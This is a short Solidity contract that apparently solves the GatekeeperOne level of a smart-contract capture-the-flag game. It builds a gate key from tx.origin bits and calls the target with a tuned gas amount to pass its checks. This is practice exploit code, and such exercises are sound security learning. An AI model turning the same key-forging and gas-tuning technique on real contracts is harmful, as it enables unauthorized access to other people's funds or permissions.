// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

interface IGateKeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Solving {
    function attack(address _victim, uint256 _gas) public {
        bytes8 gateKey = bytes8(uint64(1) << 32 | uint16(uint160(tx.origin)));
        require(IGateKeeperOne(_victim).enter{gas: (8191*3)+_gas}(gateKey));
    }
}
